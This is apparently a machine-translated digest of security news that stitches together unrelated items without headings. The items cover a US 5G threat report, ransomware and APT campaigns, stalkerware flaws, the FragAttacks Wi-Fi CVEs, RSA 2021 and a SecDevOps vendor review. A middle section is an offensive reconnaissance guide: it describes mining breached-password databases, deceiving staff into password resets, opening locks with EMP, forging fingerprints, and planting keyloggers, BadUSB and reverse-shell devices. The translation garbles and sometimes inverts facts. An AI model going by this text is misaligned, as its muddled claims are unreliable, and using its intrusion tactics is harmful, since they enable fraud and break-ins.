These advances will provide connectivity to billions of devices and pave the way for applications to enable new innovation, new markets, and global economic growth.

But the United States considers these developments to pose significant risks to national security, economic security, other national and global interests.

The National Cyber Security and Infrastructure Agency (Cybersecurity and Infrastructure Security Agency), the National Security Agency (National Security Agency), and the Office of the National Intelligence Agency Director ((Office of the Director of National Intelligence) jointly issued a report this week, In the report, the US believes that 5G threatens national and economic security, There could also affect other countries and global interests, Threat vectors based on policy and standards, supply chain, and 5G system architecture are also introduced, The 5G Threat Model Working Group for this was created (5G Threat Model Working Panel).

The 5G Threat Model Task Force is part of the national 5G security strategy that initially focuses on exploring and prioritizing potential threat vectors for 5G infrastructure, reviewing existing work agencies, identifying and generating a summary list of known threats and potential threats to 5G environments, identifying and developing example scenarios that can employ 5G, and assessing the risks of 5G core technologies.

This analysis represents the 5G Working force on the assessment of the type of risk from US 5G adoption, not an exhaustive risk summary or technical review of attack methods, but results from extensive analysis of the 5G infrastructure threat assessment.

As extortion attacks occur frequently and their numbers increase year by year, the drive of the interests behind it aggravates the outbreak of extortion incidents.

Rransomware usually spreads through the form of Trojan viruses, posing itself as seemingly harmless files such as using social engineering methods such as mail to trick victims from clicking links to download, and may also spread using software vulnerabilities across connected computers like many other worms.

Micro step intelligence bureau recently wrote the popular ransomware analysis summary report, integration and comb the popular family famous attacks in the history of the development of ransomware, review the encryption of ransomware and transmission channels, imagine the future development trend of ransomware, also the emergency disposal process after the attack in this analysis summary report.

The last article mainly around the ransomware development background, details about the rise of PC Cyborg, asymmetric encryption, cryptocurrency, RaaS, and the development of double damage, through spam, RDP / weak password, vulnerability utilization, using PsExec tools, WMI command, eternal blue vulnerabilities such as horizontal movement, and expand the influence of TTP.

l FortiGuard lab studies found other tactics used by DarkSide extortion gangs attacking colony pipelines, destroying disk partition guides for attacks, a new tactic in ransomware.

The malware variant, although relatively small memory, provides a larger payload than expected.

An attacker can use the DarkSide malware variant to find the partition on the victim drive to cause further damage, and also find the domain controller connected to its Active Directory(activity directory via LDAP anonymous authentication), causing greater damage.

In addition, DarkSide variants can interact with Active Directory using COM, trying to remove certain variables.

Other actions of DarkSide malware are similar to Petya (also known as NotPetya) ransomware that guides the ransom information from the infected disk master boot record (MBR) when starting the computer; DarkSide malware scans the victim drive to find whether the victim computer drive is a multi-boot system and finds the volume / partition attempts to encrypt files for each partition (disk).

The FortiGuard event response team also observed other activities related to the DarkSide extortion gang and revealed the tactics and techniques used by the DarkSide extortion gang: SMB metrics, HTTPS beacons, penetration components, WMI activities, etc.

Simps botnet dedicated to DDoS attacks Simps is a new botnet discovered by the Uptycs Threat Research Group in May 2021, belonging to the Keksec family and mainly dedicated to DDoS attack activities.

The Simps binaries are mainly downloaded through the Shell script, the Gafgyt.

According to the team, 1) Simps botnet binaries use Mirai and Gafgyt modules for DDos functions; 2) botnets may be in the early stage of development due to the presence of infection after execution.The log file; 3) The author of the botnet has a YouTube channel and Discord Server, for the use and demonstration of botnets; 4) the Youtube channels and historical data provide evidence that the Simps botnet has been active since April 2021; 5) the Discord server discussion and threat intelligence data provide us with evidence that the Simps botnet may connect with the Keksec Group.

Rransomware Using Windows API Worm in Network MountLocker ransomware began running as ransomware as a service (R a a S) in July 2020 with developers conducting ransomware and payment sites programming and recruiting members to invade businesses and encrypt their devices.

MalwareHunterTeam shared this week a MountLocker sample suspected to be a MountLocker executable with worm capabilities to propagate itself to other network devices.

The MountLocker ransomware first uses the NetGetDCName() function to retrieve the name of the domain controller, uses the ADsOpenObject() function to perform an L D A P query on the ADS of the domain controller, and passes the credentials on the command line.

Once connected to the Active Directory service, it traverses the database for "objectclass = computer" objects, remotely copy the ransomware executable, create the Windows service to load the executable, and continue to encrypt the device data.

The MountLocker ransomware uses Windows Active Directory Service Interfaces API as its worm function to find all devices in the infected Windows domain via the API and encrypt it.

While this API has been found in other malware (e. g., TrickBot), this may be the first "corporate ransomware for professionals" to use these API to perform built-in reconnaissance and spread to other devices.

The Konni APT organization has been continuously active since 2014.

The group often uses harpoon phishing attacks and often uses North Korea-related topics or social hotspots as bait to attract users to view and execute attachments.

The Microstep Intelligence Agency recently captured an analysis of the Konni APT group using the situation in North Korea through a threat hunting system.

The attackers bait harpoon attacks on hot topics such as "on the impact of sanctions on the situation in North Korea" and "advice to resolve the North Korean crisis";

The malicious documents are Russian, but some of the document editing environment is Korean. Combined with the geographical factor analysis of the organization, the main target is Russian organizations;

The malicious module carried in the document will download multi-stage malicious loads from the server, and finally load the execution backdoor remote control module to achieve remote control of the target host;

According to the multi-dimensional correlation information, the attack activity continues the organization's previous attack techniques;

Microstep online extracts a number of relevant I O C by tracing the relevant samples, IP, and domain names, which can be used for threat intelligence detection.

Microstep online threat perception platform TDP, local threat intelligence management platform TIP, threat intelligence cloud API, Internet security access service OneDNS have all supported the detection of the attack and gangs.

Organization FIN 7 is spreading Lizar Backdoor FIN 7 Organization is a suspected APT organization with a Russian background, been active since around 2013.

Since 2015, FIN 7 has been mainly targeting industries such as US retail, catering and hospitality.

Between 2020 and 2021, targets were shifted to finance, education, healthcare and other industries, and the victims consisted mainly of a German IT company, a major financial institution located in Panama, a gambling-doctoral institution, multiple educational institutions, and pharmaceutical companies in the United States.

FIN 7 attack activities mainly use Carbanak malware to stop within the victim network.

BI.The ZONE Threat Research team recently observed FIN 7 organizations disguised as legitimate networks security companies to distribute Lizar. across Windows networks

Lizar is a recently developed malicious toolkit Lizar (formerly known as Tirion) spread by FIN7 on the Windows platform, which can be investigated, foothold, data retrieval and lateral movement in infected systems.

Lizar client contains r a t component with a Carbanak public key directory whose server similar to Lizar client is used.NET Framework is written, but unlike the client, the server runs on a remote Linux host.

FIN 7 organizations use phishing mail with malware to access the victim network, infiltrate the network, load plugins via loader, execute commands, get system information, retrieve process ID, and finally encrypting data to C2.

ESET researchers recently published an article on Android stalkerware(tracking software) that revealed that attackers may abuse stalkerware monitoring server defects, applications defects, and network leaks to expose victims' privacy data.

The stalkerware can be installed to the victim's device for physical access without the knowledge of the victim, and the side loading of the stalkerware, on the victim's device is widely disseminated through social engineering.

stalkerware are often disguised as apps that protect children, women, employees from being tags.

The defects involved in stalkerware are the transfer of the unencrypted HTTP protocol from victim devices to the tracking software server (CWE-200), external media storage of sensitive information (CWE-922), the disclosure of sensitive victim information to unauthorized users (CWE-200), insufficient transmission data validation (CWE-345), etc.

While ESET has reported these issues to the affected manufacturers, only six have fixed the problems, 44 have not answered, one has decided not to fix them, and seven have promised to fix them, with no patch updates as of May 17.

Information leak vulnerability in servers Talos reported this week a possible information leak vulnerability in macOS, an integer overflow vulnerability in Apple macOS's SMB server, number CVE-2021-1878.

The SMB (Service Message Block) is a common network file sharing module in the Windows network environment, but the macOS contains implementing its own pair-to-server and client components.

TALOS-2021-1237 (CVE-2021-1878) is an integer overflow vulnerability that exists in how the macOS SMB server processes SMB3 composite packets.

In addition to this vulnerability to exploit sensitive information by sending specialized packets to the target SMB server, attackers can also use integer overflow to bypass encryption checks and cause a DDoS denial of service.

In addition, Talos has worked with Apple to ensure that this issue is resolved and to provide update patches to affected customers, all following Cisco's vulnerability disclosure policy.

For the macOS information disclosure breach, Microstep Intelligence recommends that you update the patch as soon as possible.

Information collection is one of the important links of penetration testing, the first step of the long march, and the most important step of the successful meeting.

Each attack and defense game makes oneself more aware of how many dishes, and how important information collection is, so the cliche and information collection, hope to help some friends.

Information collection is mainly to collect the configuration information of the server and the sensitive information of the website, mainly including domain name information, subdomain name information, target site information, target site real IP, directory files, open ports and services, middleware information, script language and so on, etc.

Combined with the collection experience of various big guys, Cainiao summed up 8 ways to collect information, there are shortcomings, welcome teaching, welcome the axe is right.

Personal feeling focuses on handy tools, an IP agent pool, powerful daily dictionaries, clear mind maps, and multiple practical experiences.

Simply put, it is a database used to inquire whether the domain name has been registered, and (such as the details of the domain name, the registered).

Query of domain name information is achieved by whois.

Early whois queries mostly existed as command column interfaces, but now there are some online query tools with simplified web interface that can be querto different databases at a time.

The query tools for the web interface still rely on the whois protocol to send query requests to the server, and the tools for the command column interface are still widely used by the system administrators.

The whois usually uses the TCP protocol for port 43.

The w h o i s information for each domain name / IP is saved by the corresponding governing authority.

Whois queries our main focus on registrar, registrar, mail, DNS resolution server, registrar contact number.

At present the common query method is mainly through the stationmaster tools and other third-party platform query, of course, actually can also in the domain name registrar that query has registered the domain name, such as China wan net (ali cloud), western digital, new network, net, resources, 35 Internet, new Internet, orange Internet, love name, easy name network and so on.

You can also query it through your own registration agent.

Record information query website record information is according to the national laws and regulations, the owner of the website to the relevant departments of the record, is a way of the Ministry of Information Industry to the website, is to prevent illegal website business activities on the Internet, of course, mainly for the domestic website.

Our main attention is: unit information such as name, record number, website responsible person, legal person, e-mail box, contact telephone number, etc.

The more subdomains were collected, the more targets we tested and the greater chance of successful target system penetration.

Subdomain name is a good breakthrough when the main station is impeccable.

There are many detection tools, but the important thing is the need to improve the daily dictionary, the powerful dictionary is the hard truth.

Common ones are layer subdomain name excavator, subDomainsBrute, K8, orangescan, DNSRecon, Sublist3r, dnsmaper, wydomain, etc., which mainly recommend layer subdomain name excavator (simple to use, detailed interface), Sublist3r(lists the domain name found under multiple resources) and subDomainsBrute.

, Such tools github have download address and use.

Search engines like Google, Bing, shodan and Baidu can be used for search queries.

Google Search syntax: https://editor.csdn.net/md/?articleId=107244142Bing 。

Search for the syntax: https://blog.csdn.net/hansel/article/details/53886828。

Baidu Search syntax: https://www.cnblogs.com/k0xx/p/12794452.html 。

Third-party aggregation applications enumerate third-party services that aggregate large DNS datasets and use them to retrieve subdomains of a given domain name.

SSL/TLS certificates usually contain domain names, subdomain names and mail addresses which are the information we need to get, usually CT is a project of CA, CA posts each SSL/TLS certificate to the public log, the easiest way to find the certificate that the domain name belongs to is to search for some public CT logs using the search engine.

CDN is an intelligent virtual network based on the existing network, relying on deployed edge servers, through the central platform load balance, content distribution, scheduling and other functions, enable users to obtain the required content nearby, only in the actual data interaction will be from the remote web server response, reduce network congestion, improve the user access response speed and hit rate.

CDN's key technologies are mainly content storage and distribution technologies.

It is simple to determine whether cdn, use various kinds of ping services, to see if the corresponding IP address is unique, if not only is mostly to use CDN, many places Ping website has: http://ping.chinaz.com/http://ping.aizhan.com/。

Use nslookup for detection, in principle, if the return domain name resolution corresponds to multiple IP addresses is mostly using CDN.

Common tools are the nmap, masscan, zmap and royal sword tcp port high-speed scanning tools, as well as some online port scans.

We can sort into t x t after collecting the ip corresponding to the subdomain, then n m a p bulk port scan, service blasting, and vulnerability scan, provided that the IP is not blocked and the proxy pool can be adopted.

It is recommended best under kali and use under windows is cumbersome.

Script modules that identify w a f fingerprints are also included on the Nmap.

Mainly through tool scanning, mainly there are royal sword (many dictionary enhanced versions of the Internet), 7kbstorm, search engine (Google, baidu, bing, etc.), search engine search sensitive files are also more common.

Social engineering is a means of harm such as deception and injury through psychological weaknesses, instinctive reaction, curiosity, trust, greed, a hacker attack method to gain trust and obtain confidential information; a psychological manifestation of human vulnerability, greed, etc.

We can start from the social staff and social work library, social work company sellers, business personnel, guards, front staff to obtain personal information, email, telephone, intranet address, physical access control; we can cheat sales get email reply and obtain Intranet IP and server information, we can cheat customer service to apply to reset the password, send vpn account, etc.

We can query for some key information through the social worker library.

For many social work libraries, storage reaches T and 100 million data is small case.

The content includes the account password, email address, personal information, and so on.

Internet social worker library, how much power, depends on the quantity and quality of the database, theoretically reached a certain amount, a lot of things can be found out, especially those basic all websites are a password, as long as a social worker library collected one of the database has his account password, so the password can directly log on the user's other account.

External wireless network card is mainly used to cooperate with kali to crack the wireless password, now is generally by grasping the handshake package and then running the package to crack, but also by forging SSID phishing, middleman attack and so on, mainly to obtain the wireless network password, network segment information, etc.

Big pineapple can completely mimic the preferred network, thus realizing the middleman attack, get the wireless network information we want, and collect information for the attack target system.

The current operating frequency of electrical devices and circuits is constantly increasing, while the operating voltage gradually decreases, thus showing increasing sensitivity and susceptibility to electromagnetic pulses (EMP).

At the same time, the integrated circuit in the electronic system is more sensitive to electromagnetic pulses, often a large electromagnetic pulse, will make the integrated block produce error code, or even electronic components fail or burn down, so we can use EMP interference to open part of the electronic access control and electronic password lock.

If we can't open the access control with EMP, we still have a way, but we need to get slightly closer to the target, find the right opportunity to crack the IC card, or copy the ID card.

Then break through the access control, to achieve physical attack and information collection.

Of course, we can also obtain fingerprint information through social workers, and print a fingerprint film exactly like the original fingerprint to break through the physical access control, office PC fingerprint recognition, etc.

If you have access to the target host, you can access the keylogger between the host and keyboard and configure connected WI-FI, to send keyboard tapping data back to the remote server in real time.

After entering the office location or Intranet, an PacketSquirrel, can be secretly installed as an intermediary attack tool. PacketSquirrel can capture the packets of the network endpoint and can obtain remote access rights using VPN and reverse shell to collect some information for the attack target system.

badusb is a kind of HID (human-machine interface) attack, also known as a hot plug attack.

Imagine you can walk to a computer, insert a seemingly harmless USB drive, then install a back door, tap documents, and steal the relevant password., Collect the relevant information about the target system.

There are still many attack ways of near-source penetration. Near-source information collection is now one of the ways of information collection in the offensive and defense training. Some detailed near-source attacks can pay attention to the "Internet of Things IOT Security" public account of the team partners.

Three of the newly discovered vulnerabilities are frame standard design flaws in frame aggregation and frame fragmentation functions affecting most devices, while others are programming errors for Wi-Fi products.

These vulnerabilities could allow the attacker to control the system and steal confidential data.

Mathy Vanhoef, a security researcher who discovered the FragAttacks vulnerability, said that all Wi-Fi devices were affected by at least one vulnerability, and most devices were affected by multiple vulnerabilities.

All modern Wi-Fi security protocols, including the latest WPA3 specifications, are affected.

Even Wi-Fi's original security protocol, the WEP, was affected.

That means that all W i-F i devices since 1997 are spared.

The impact of FragAttacks vulnerabilities, however, it is not so easy to exploit them.

An attacker must be within the Wi-Fi range of the target device to steal sensitive user data and execute malicious code after successful utilization to cause the device being completely taken over.

However, programming errors in the FragAttacks vulnerability are easily exploited, allowing attackers to easily abuse unpatched Wi-Fi products.

The programming error vulnerability in the FragAttacks vulnerability is as follows: a CVE-2020-24588: aggregation attack (accepting non-SPP A-MSDU frames).

CVE-2020-24587: hybrid key attack (reorganize fragments encrypted under different keys).

The CVE-2020-24586: fragment cache attack (the fragment was not cleared from memory when reconnected to the network).

The Wi-Fi implementation vulnerability is as follows: CVE-2020-26145: accepts explicit broadcast segments as full frames (in an encrypted network).

CVE-2020-26144: accepts plain text A-MSDU frames (in encrypted networks) starting with the EtherType EAPOL RFC1042 header.

The CVE-2020-26140: accepts plaintext data frames in a protected network.

The CVE-2020-26143: accepts fragmented plaintext data frames in a protected network.

Other implementation vulnerabilities discovered by Vanhoef are as follows: CVE-2020-26139: forwards EAPOL frames, even if the sender is not yet verified (and should only affect the AP).

CVE-2020-26146: recombines the encrypted fragments with discontinuous package numbers.

CVE-2020-26147: reassembles a mixture of encrypted / plain text fragments.

CVE-2020-26142: handles the fragment frame as a full frame.

CVE-2020-26141: did not verify the TKIP MIC. of the fragment frame

The researchers also produced a video demonstration showing how an attacker could take over an unpatched Windows 7 system within the target's local network.

Some vendors have taken security measures The Internet Security Promotion Industry Alliance (ICASI) says suppliers are developing patches for their products to ease FragAttacks vulnerabilities.

CISCO, HPE/Aruba Networks, Juniper Networks, Sierra Wireless and Microsoft have released security updates and recommendations for FragAttacks.

These security updates were prepared during a nine-month coordinated disclosure process under the supervision of the ICASI and the Wi-Fi Alliance.

FragAttacks vulnerability mitigation If a user's Wi-Fi device provider has not yet issued a security update, it doesn't mean just sit still, but there is any other way to mitigate the impact of the vulnerability.

First, all websites and online services that ensure personal access are implemented using Hypertext Transfer Protocol Security (HTTPS) protocols.

In addition, you can disable fragmentation in Wi-Fi 6(802.11ax) devices, pairwise heavy keys, and dynamic fragmentation.

An open source tool is also available on GitHub that is used to check whether access points and Wi-Fi clients on a user network are affected by the FragAttacks vulnerability.

RSA 2021 will begin on May 17, San Francisco time, the first time the RSA conference has ever adopted a web virtual conference.

More than 100 online information security companies worldwide, including Green Alliance Technology, will attend the conference, and 462 top security practitioners around the world will participate in sharing the conference.

It can be predicted that through this security event, we can learn about the latest security dynamics, cutting-edge technology concepts and future security direction.

I. Theme (Theme) The RSA conference has a theme (Theme) every year, and the theme of this conference is that Resilience, means to have the ability to quickly recover before the good state after suffering a blow.

This not only requires us to have strong recovery capacity in the event of disaster, but also reminds us to make safety deployment, operations and emergency reserves in advance. Just like this epidemic, we cannot stop some disasters, but as long as we defend well in advance, we can fearless and recover quickly in the face of crisis.

The conference will focus on sharing the security framework, technical architecture, application scenarios, laws and regulations and other technical means used by Resilience practitioners to combat the changing and upgraded attack capabilities of attacks, so that their own protective business can be quickly restored and restored in attacks.

RSA 2021 consists of a total of 24 security salon themes (Track), and the main content and speech in the conference are distributed between May 17 and 20, San Francisco time.

Among them, 46 of the world's top security experts will share topics (Keynotes) as speakers. The following Green Alliance gentleman has selected several speeches worthy of the attention of security practitioners.

The May 17 keynote speech, C E O and president of Fortalice Solutions LLC Theresa Payton, distorted truth, an invisible war of hijacking ideas, will introduce how the attacker uses the wrong information to manipulate public opinion to influence the election, how to help technology companies, governments, enterprises learn, discover and prevent the generation and spread of wrong information, to avoid ideas being artificially manipulated.

The May 19 keynote address was "What Really Happened to SolarWinds:", shared by SolarWinds President and CEO Sudhakar Ramakrishna and Vice President and Director Laura Koetzle of Forrester?It will show you the most complex supply chain attack process so far, which is the first unique insight on security after the positive response to the attack, allowing security researchers to provide better protection against the enterprise supply chain from another perspective.

The May 20 keynote, Global Threat Bulletin: exposing Hacks and Attors shared by Dmitri Alperovitch and Sandra Joyce, Executive Vice President and Director of FireEye, will share some of the latest attacks in the global threat patterns, study the attacks of APT organizations from various countries and nationalities, and provide targeted security strategy advice.

Elastic and recovery as the theme of this conference (Theme), will not only will mention the story about the rapid recovery of business after enterprise attack, but also a lot of topics on how to use advanced architecture, virtualization technology, artificial intelligence and security frameworks to help enterprises build the ability to quickly restore business system after attack.

Threat intelligence is still a hot topic at this conference. Intelligence, as a necessary cornerstone of security products, is the basis for global companies to fight against changing attacks.

But why does intelligence sharing always encounter resistance, or even sharing failure?Many topics of this conference will give corresponding answers and improvement measures.

Intelligence-based threat hunting is also what is to be shared and discussed in this meeting. There will be a lot of space on how to capture threat information through advanced technologies and skills, how to efficiently track hackers and how to predict threats through data use and analysis.

The MITER ATT&CK attack knowledge base framework, the NIST CSF network security framework, and the FAIR information risk factor analysis framework are still the framework themes to share more content, indicating that various security enterprises constantly establish a security system and improve the risk management process through the framework.

The new sharing and application of the MITER Shield active defense knowledge base framework added in this meeting became a highlight, providing framework support for enterprises to transform from passive defense to active defense.

Zero trust has become one of the hot topics of the conference, many manufacturers will analyze the zero trust architecture from different perspectives, including: zero trust system construction scheme, zero trust challenges, zero trust when considering the deployment of zero trust, believe that the zero trust topic of the conference will let practitioners in relevant fields have new harvest.

The rapid development of 5G network, following the rapid development of edge computing has also become a hot topic of sharing, sharing content includes the new changes brought by 5G network to network security, 5G network security construction and information monitoring strategy, how the government to promote security 5G ecosystem, 5G driven edge hybrid computing construction and other content.

The topic includes technology, strategies, regulations and many other dimensions.

In 2020, the Internet of Things botnet was extremely active, and the different worm variant versions continued to conduct indiscriminate attacks on the Internet of Things devices, and the malicious behavior was mainly DDoS and mining.

Internet of Things security has become a content that all enterprises need to focus on, including manufacturers.

How to protect the Internet of Things, how to monitor the Internet of Things attacks, and the standards and methods to evaluate the Internet of Things security have become the theme of the Internet of Things security at this conference.

With the development and popularization of cloud computing and other enterprise-level technology applications, the global industrial Internet has actually been practiced in all walks of life.

The breadth not only covers services, industry and agriculture, but also from business to public welfare and government, the whole society to the comprehensive Internet; in depth, from marketing services, production research and development to operation and management, the Internet penetration into all links within the organization.

Cloud environment includes a variety of cloud computing environments, such as public cloud, private cloud, and hybrid cloud.

Cloud cloud environment faces various threats such as physical data concentration, network isolation and detection difficulties, host and virtual machines, data security, host attacks, and application security.

Sharing topics around the above threats, from the technology, framework, regulations and other perspectives of the analysis, to bring new opinions and suggestions for the cloud security construction.

The COVID-19 outbreak in 2020 increased the cyber security threat to the supply chain, and cyber vulnerabilities in the supply chain continue to increase since the outbreak in 2019.

SolarWinds-based supply chain attacks have become a typical case of supply chain security events.

It is foreseeable that supply chain attacks will grow or even break out over time.

Security practitioners need to pay more attention to the supply chain security in the government, enterprises, education, energy and other industries.

The topic of this conference shared relevant experience and skills from the perspectives of vulnerability analysis, supply chain trust, supply chain trust, supply chain ecology, supply chain process specification and other aspects, aiming to help security practitioners better help relevant enterprises establish a better supply chain security ecology.

AI-based technology is increasingly entering our production system. In network security, AI performs automation tasks through machine learning, thus reducing the workload of security experts, and discover and detect threats faster and more accurately.

Attackers are constantly evolving, and there have been attacks on AI, including data pollution, confrontation with input, data poisoning, model theft and other methods.

In the face of these targeted AI attacks, security experts have what algorithm improvement and evolution, this conference will share the related A I offensive and defense content.

Under the COVID-19 epidemic, the world is tracking the virus chain of infection, how to balance personal privacy and personnel tracking is a topic of concern for every country, enterprise; ransomware is rampant, the new ransomware constantly endanger the data security of government companies, the large range of oil supply system caused by American companies extortion, also put forward a severe test for the data security of various enterprises.

Abnormal's Mail Gateway: This product is based on behavioral data science, determines the known correct user mail behavior, detect and block malicious mail, and effectively prevent mail leakage and harpoon attacks.

The product uses the next-generation API architecture to complement Microsoft's Office,Google's Workspace, to make the office environment on the cloud more secure.

Can make the risks in the research and development process fully controllable and visible.

With data-driven decisions, 360 security and compliance risks for applications and infrastructure are well-viewed.

Axis security's zero-trust products: Products can quickly deploy zero-trust solutions with agent-agent enterprise services, reduce deployment speed even down to a minute level, and give administrators easier and secure management access to protected business.

Provide an absolutely controllable zero-trust isolation scheme to ensure the safety of the business.

Cape Privacy's encryption learning platform: It innovatively uses the new machine learning method, —— encryption learning, which can train and learn the data in the cloud by using algorithmic models without decrypting.

Enables data scientists to use the encrypted data, and can improve the accuracy of the data models.

DEDUCE's Authentication Security Platform: The product platform combines identity history data from more than 150,000 Web sites to create what is called the world's most diverse identity data.

Use of identity risk intelligent authentication and active alarm functions to provide powerful authentication solutions, effectively prevent fraud, and reduce the risk of identity fraud.

OPEN RAVEN's cloud data security platform: by automatically mapping all cloud resources, visualization managed cloud resources, clearly display the physical location of all data; automatically classify data using machine learning; use transparent encryption and active identification technology to prevent data leakage; self-developed high-speed cross-network transmission protocol to make each data rapid and convenient sharing.

Satori's Data Access Security platform: It provides a data access service that monitors, classifies, and controls access to sensitive data.

Fully automated processes, concise operating interface, DataSecOps-based data access control allow administrators to quickly deploy and manage data.

STRATA's multi-cloud identity management platform: Companies are likely to use multiple cloud platforms, such as Azure, AWS, Google Cloud Platform.

The key pain point of cloudy cloud is that management of cloudy platforms is not only cumbersome but also prone to security risks.

STRATA's products can just solve this pain point, and using distributed authentication can make enterprises convenient and fast management multi-cloud platform.

WABBI Company's DevSecOps Infrastructure Platform: Platform and development workflow integration together, so that research and development, security, operational guarantee can form a closed loop, security can be expanded across the DevOps workflow, while considering the security and agility of research and development.

WIZ's cloud infrastructure security platform: This platform is a brand new method for cloud security. The platform has multiple features of environmental isolation, vulnerability and patch management, database and asset management, identity authentication management, attack surface burst and leakage management, security configuration management and so on.

You can quickly locate the risk in the cloud environment and respond quickly.

It can be seen from the selected top 10 innovative products that zero trust, data security, identity security, cloud security and other security fields are in urgent need to supplement innovative ideas and methods.

Green Alliance Technology continues to pay attention to the innovative content and hot topics of RSA, and combined with its own accumulated security capabilities to create more complete product lines and solutions, to provide comprehensive safety protection for various governments, operators, enterprises, energy, education, medical care, finance, transportation and other industries.

Today, we want to introduce the manufacturer is: WABBI.

Company Introduction to WABBI was founded in 2018, Based in Boston, USA, The company focuses on the SecDevOps sector, Through its SecDevOps products can enable enterprises to deliver software faster and more safely, The current number of companies is around 20-30, The company's CEO and founder is BrittanyGreenfield[1], Graduated from Duke University, And read the MBA at MIT, From his work resume alone, The founder is mostly engaged in marketing-related fields, There is not much intersection with the information security field, But the advantage lies in having a deep understanding of the existing software market, And has a prospective research in the DevOps direction, In May, 2019, The company has raised $330,000 in its first round of funding, Investors are led by the Underscore VC Corporation, This round was also involved by Douglas Levin, Ashley Smith et al.

With the continuous development of technology, to promote the integration of development, DevOps represents not a specific implementation technology, but a methodology, which was proposed in 2009.

The ultimate goal of DevOps is to break the barriers and gaps between developers and operators, and efficient organizational teams collaborate with automated tools to complete software lifecycle management, so as to deliver high-quality and stable software faster and more frequently.

As we know, DevOps affects not only the development team (Dev) and the operation and maintenance team (Ops), Security Team (S e c), In the system life cycle (SDLC Systems DevelopmentLife Cycle), Security team because they often focus on the operational phase, Therefore, the safety of the development stage is often ignored, So the concept of "safe and left shift" has been very popular in recent years, It emphasizes that safety factors should be incorporated in the early stages of application development, common, We add security (S e c) between development (Dev) and O & M (Ops), The DevSecOps concept is known, The focus is on integrating the security tools themselves into the CI / CD workflow, And the safety tools are mainly included in the application test, release, and operation and maintenance stages.

However, from a security perspective, although DevSecOps guarantees DevOps security to a certain extent, it lacks the project environment (the context environment of the application) because it does not cover the whole closed-loop process of DevOps, and thus, DevSecOps cannot solve the priority problem of application security.

In addition, the lack of the project environment will also reduce the overall development, operation and maintenance efficiency.

In view of this, the concept of SecDevOps, moving the security section (Sec) to the far left, SecDevOps follows the security deployment to every stage of the system life cycle, rather than only the testing, deployment, operation phase, as shown in Figure 2 SecDevOps [9] Through the consistency of security and development processes, we can predefined processes to ensure security detection at the correct time and repair of security issues in the order of priority.

To practice the SecDevOps concept well, WABBI provides a set of platforms that manages security tools and code security for pre-release applications, and ensures seamless integration of security tools into existing DevOps workflows.

Specifically, WABBI's security protection ability can be realized by assigning different strategies to different applications, coupled with the control measures for each strategy and the analysis method of the security test results, the platform effectively accelerates the security delivery of the application and provides the security infrastructure for the DevOps teams of various enterprises.

WABBI provides a set of SecDevOps platform, mainly composed of manager, policy choreographer, version controller, it should be noted that the official three core modules are not integrated with the existing DevOps process, the author speculated through the existing materials, its manager and policy choreography to ensure the application code design, construction, test stage, and the version controller to ensure the application release and operation stage, the three can realize the closed loop of the whole SecDevOps process.

Through the information provided on the official website, it can be seen that the manager mainly provides users with project management functions, including project import, initial strategy allocation, application vulnerability detection, visual display, etc. Users can carry out specific operations through the platform.
We can see that the process of users importing the project is divided into four steps, namely, project selection, custom setting, project description (available for initialization strategy allocation), and project overview (visual display).

From the overview page, the WABBI platform provides users with visual visualization of the security issues, project security issues, the "immediate visibility" of the current project to ensure the timely resolution of the problem; on the other hand, the security debt (Security debt) is effectively controlled to ensure the timely delivery of the application.

WABBI implements automated policy orchestration through policy choreography. Its core is a centralized policy engine that assigns different policies to appropriate projects. With the changing application security risks, users can know which projects are affected by policy changes to ensure that the application always meets the current security standards.

By viewing its official Demo video, the author intercepted the platform policy management related interface, as follows: Figure 5 policy management interface 1 Figure 6 policy management interface 2 We can see that the platform provides relatively many types of policies by default, including authentication, authorization, malware, communication, files, business logic, etc., each policy type contains many policies, such as NIST security standard policies.

In addition, from the interface, the policy management section also supports user custom policy types, and we can manually import policies. For example, we can import OWASP security standards into the policy management module, as shown in Figure 4, which can strengthen the scalability of the policy to some extent.

From the official website information, the author learned that the version controller is mainly used to ensure that every application version release follows the safety standards. The specific version controller can coordinate all safety and quality checks. When it does not meet the safety standards, the version controller can inform the specific user what needs to repair, so as the code can be delivered on time.

In addition, users can view the corresponding security issues through the platform for different versions of the project through the platform, which is quite intuitive and useful for users, as shown in the following figure: Different versions of the project view the page, we can see the application code delivery at each stage of the DevOps process, thus simplifying the process of post-compliance inspection, such as WABBI platform, we can view the system release details after integrating Azure Pipelines.

CMCC Program CMCC is all called CybersecurityMaturity Modle Certification, or Network Security Maturation Model Certification, a program initiated by the Department of Defense to measure the ability, readiness, and complexity of enterprises in the field of cyber security.

Specifically, CMCC focuses on the adoption of practices and processes, so that enterprises can effectively implement network security in all aspects, transforming enterprises from passive network security mode to active network security mode.

WABBI claims that its SecDevOps platform can enable enterprises to implement the necessary practices and processes in the face of CMMC standards. The following figure is the flow chart of C M C C solutions provided by WABBI: Figure 11 CMCC solutions [10] Figure 11 shows that through the centralized policy management of the WABBI SecDevOps platform, all recorded application security practices can be implemented.

In addition, the comprehensive monitoring of application development and operation and maintenance processes through the WABBI SecDevOps platform can enable users to receive effective information in the shortest time, and reduce the process complexity to some extent, so as to promote enterprises to the direction of CMCC standards.

The ATOATO that provides sustainability is all called Authority-to-Operate, or operation authorization, which specifically refers to the authorization to operate a system and the clear acceptance of the risks of enterprise operation and enterprise assets based on a set of security control measures.

Because the traditional authorized operation process cannot keep up with the speed of software development today, the ATO process is often unsustainable, and WABBI claims that its SecDevOps platform can be part of the system life cycle of applications, and reduce the application operation and maintenance costs and the risk of project delivery, to achieve continuous ATO.

Ongoing ATO is essential to meet the rapid and secure delivery of software to users.

Integration with the existing DevOps ecological chain introduced through the website, the author found that WABBI and the existing DevOps ecological chain is relatively comprehensive, you can see that the ecological chain can cover almost every stage of the DevOps process, but we can also find that the number of integration tools is less, which may also be related to WABBI company in the startup period, its products are still iterative expansion, to meet the needs of more users.

Through the introduction of WABBI platform above, we can see that a highlight is the better practice of "security left shift" (SecDevOps) concept, through the deployment of security mechanism to each stage of the system life cycle, can make the security process and development operation and maintenance process, so as to eliminate the development team concerns between agility and security, better than DevSecOps,SecDevOps concept through the integration of development, operation and security.

However, WABBI also has some challenges, and the author summarizes the following three points from the technical point of view.

WABBI claims that its product version controller can instead of manual approval, and timely inform relevant users, but as we know, automation can not completely replace labor, can only reduce labor cost to some extent, and because the automation response is based on rules, imperfect rules may further lead to the system false report or missed report, for this case, the author did not see how WABBI on the official website, so it is undoubtedly a challenge for WABBI.

